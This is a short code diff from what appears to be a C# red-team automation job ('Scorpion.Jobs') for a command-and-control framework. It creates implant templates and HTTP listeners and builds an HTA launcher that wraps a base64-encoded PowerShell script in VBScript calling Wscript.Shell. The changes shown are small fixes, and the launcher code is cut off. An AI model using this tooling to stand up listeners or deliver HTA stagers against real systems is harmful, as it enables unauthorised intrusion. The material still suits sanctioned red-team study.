@@ -334,7 +334,7 @@ namespace Scorpion.Jobs
     {
       var request = new RequestBuilder(Api);
       var template = await request.GetImplantTemplateByName(TargetDefaultHttpTemplate);
-      var kd = new DateTime();
+      var kd = DateTime.Now;
       kd.AddDays(60);
       var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
 
@@ -410,8 +410,8 @@ namespace Scorpion.Jobs
       var listenerType = await request.GetListenerTypeByName(listenerTypeName);
 
       connectAddresses.Add(connectAddress);
-      // var urls = new List<string>();
-      // urls.Add($"http://{connectAddress}:{connectPort}");
+      var urls = new List<string>();
+      urls.Add($"http://{connectAddress}:{connectPort}");
 
       HttpListener httpListener = new HttpListener();
       httpListener.Name = "default";
@@ -419,7 +419,7 @@ namespace Scorpion.Jobs
       httpListener.Guid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
       httpListener.BindAddress = "0.0.0.0";
       httpListener.BindPort = connectPort;
-      httpListener.Urls = new List<string>();
+      httpListener.Urls = urls;
       httpListener.ConnectAddresses = connectAddresses;
       httpListener.ConnectPort = connectPort;
       httpListener.ProfileId = (int)profile.Id;
@@ -444,7 +444,7 @@ Write-Output ""Error"";
       var covertedScript = Encoding.GetEncoding("UTF-16LE").GetBytes(script);
       var encodedScript = Convert.ToBase64String(covertedScript);
       var hta = string.Format(@"
-<script language=""VBScript"" >
+<script language=""VBScript"">
     Function DoStuff()
         Dim wsh
         Set wsh = CreateObject(""Wscript.Shell"")
